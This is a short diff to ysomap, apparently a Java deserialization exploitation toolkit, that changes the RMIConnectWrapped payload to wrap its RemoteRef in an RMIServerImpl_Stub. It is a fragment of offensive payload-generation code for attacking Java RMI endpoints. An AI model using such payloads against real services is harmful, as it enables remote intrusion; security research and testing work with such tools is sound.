@@ -6,6 +6,7 @@ import ysomap.bullets.jdk.rmi.RMIConnectBullet;
 import ysomap.common.annotation.*;
 import ysomap.payloads.AbstractPayload;
 
+import javax.management.remote.rmi.RMIServerImpl_Stub;
 import java.rmi.Remote;
 import java.rmi.server.RemoteRef;
 
@@ -48,7 +49,7 @@ public class RMIConnectWrapped extends AbstractPayload<Remote> {
         // ReferenceWrapper_Stub
         // UnicastRemoteObject OK
         // RMIConnectionImpl_Stub OK
-        return new CustomizedRemote((RemoteRef) obj);
+        return new RMIServerImpl_Stub((RemoteRef) obj);
     }
 
     public static class CustomizedRemote implements Remote, java.io.Serializable {
